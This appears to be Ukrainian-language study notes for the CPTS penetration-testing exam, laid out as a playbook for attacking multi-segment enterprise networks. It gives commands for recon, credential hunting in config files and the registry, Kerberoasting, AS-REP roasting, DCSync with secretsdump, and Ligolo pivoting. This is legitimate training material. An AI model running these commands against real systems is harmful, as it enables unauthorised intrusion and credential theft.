# Attacking Enterprise Networks (Capstone Playbook)

Цей файл — playbook для багатосегментних мереж. CPTS exam має кілька підмереж, де кожен хост — потенційний pivot point.

---

## Фаза 1 — Зовнішній периметр (External Recon → Foothold)

```bash
# Scope: зовнішні IP / домени
nmap -sV -sC -p- --open -oA external_sweep <TARGET_RANGE>
nmap -sV --script=banner,http-title,ssl-cert -p 80,443,8080,8443,8888 <RANGE>

# Web fingerprint
whatweb http://TARGET
curl -s -I http://TARGET | grep -i server

# Subdomain / vhost enum
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -u http://TARGET -H "Host: FUZZ.TARGET" -fs <default_size>

# Cert transparency
curl -s "https://crt.sh/?q=%25.TARGET&output=json" | jq '.[].name_value' | sort -u
```

**Типові entry points зовні:**
- Web app з File Upload / SQLi / LFI / Command Injection
- VPN / Citrix / Exchange без патчів
- SSH/FTP зі слабкими кредами (hydra / nxc)
- Exposed Jenkins, GitLab, Tomcat

---

## Фаза 2 — Internal Recon (після першого foothold)

Перше що робиш після отримання shell:

```bash
# Де я?
hostname; id; whoami; uname -a; cat /etc/os-release

# Мережеві інтерфейси — шукай додаткові підмережі
ip a; ip route; arp -a
# Windows:
ipconfig /all; route print; arp -a

# Чи є домен?
cat /etc/hosts
realm list                  # Linux domain join
systeminfo | findstr Domain  # Windows

# Швидкий host discovery у внутрішній підмережі
nmap -sn <internal-subnet>/24 --open
# або через ping sweep якщо nmap нема:
for i in $(seq 1 254); do (ping -c1 192.168.1.$i &>/dev/null && echo "192.168.1.$i UP") & done; wait
```

---

## Фаза 3 — Lateral Movement Chain

```
[External Foothold] → [Pivot via Ligolo] → [Internal Recon] → [Credential Harvest] → [Next Hop]
```

**Після кожного нового хосту повторюй:**
1. `ip a` / `ipconfig /all` → нові підмережі
2. Перевір локальні kreди: SAM, /etc/shadow, browser creds, config files
3. Перевір чи хост в домені → якщо так, BloodHound collection

```bash
# Credential hunt — Linux
find / -name "*.conf" -o -name "*.env" -o -name "id_rsa" 2>/dev/null | grep -v proc
grep -r "password" /etc /var/www /opt 2>/dev/null | grep -v Binary

# Windows
reg query HKLM /f password /t REG_SZ /s
dir /s /b *password* *creds* *credential* C:\
findstr /si password *.xml *.ini *.txt C:\
```

---

## Фаза 4 — AD Attack Chain

```
BloodHound → Kerberoast / AS-REP → password crack → ACL Abuse / lateral → DCSync → Domain Admin
```

Детально: [[AD-Enumeration]] · [[Kerberoast-ASREP]] · [[ACL-Abuse]] · [[DCSync-Tickets]]

**Мінімальна послідовність:**
```bash
# 1. Зібрати BloodHound
bloodhound-python -u <u> -p <p> -d <domain> -dc <DC-IP> -c all -ns <DC-IP>

# 2. Kerberoast → hashcat
nxc ldap <DC> -u <u> -p <p> --kerberoasting kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# 3. AS-REP Roast
nxc ldap <DC> -u <u> -p <p> --asreproast asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# 4. DCSync (якщо маєш DC replication rights)
secretsdump.py <domain>/<user>:<pass>@<DC-IP>
```

---

## Фаза 5 — Multi-Hop Pivoting

```
Attacker → [Ligolo Agent 1: 10.129.x.x] → [Subnet A: 172.16.x.x] → [Ligolo Agent 2] → [Subnet B: 192.168.x.x]
```

Для другого hop — [[Double-Tunneling-DNS]] або Ligolo listener chain.

```bash
# Додати маршрут до другої підмережі через першого агента
sudo ip route add 192.168.50.0/24 dev ligolo

# Запустити listener на агенті 1 щоб агент 2 підключився через нього
# В ligolo proxy session агента 1:
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
```

---

## Evidence Collection Strategy (під час атаки)

```
[ ] Кожен хост → Hosts-Scope.md: IP, hostname, OS, роль, відкриті порти, статус
[ ] Кожні знайдені credentials → Credentials.md одразу
[ ] Screenshot або вивід команди для кожного ключового кроку
[ ] Після компрометації хоста → записати attack path (звідки прийшов, як потрапив)
[ ] Нові підмережі → одразу в Hosts-Scope.md як "discovered via <hostname>"
```

---

## Attack Chain Template (для звіту)

```
1. External: [service/port] → [vulnerability] → initial shell as [user]@[host]
2. Pivot: via [tool] → reached [subnet]
3. Internal enum: found [credentials/service]
4. Lateral: [technique] → shell as [user]@[host2]
5. PrivEsc: [technique] → [SYSTEM/root]@[host2]
6. AD: [Kerberoast/ACL/DCSync] → [Domain Admin]
7. Objective: [flag/data accessed]
```

---

## Загальні підводні камені багатосегментних мереж

- **Забув перевірити ARP-таблицю** → пропустив хост у новій підмережі
- **Не оновив маршрути після нового pivot** → інструменти не досягають цілі
- **Credentials не внесені одразу** → на день 8 не пам'ятаєш звідки взявся хеш
- **BloodHound collection запускав без `--dns-server`** → missed objects

**Зв'язки:** [[Attack-Lifecycle]] · [[Engagement-Checklist]] · [[Ligolo-ng]] · [[AD-Enumeration]] · [[Credentials]] · [[Hosts-Scope]]
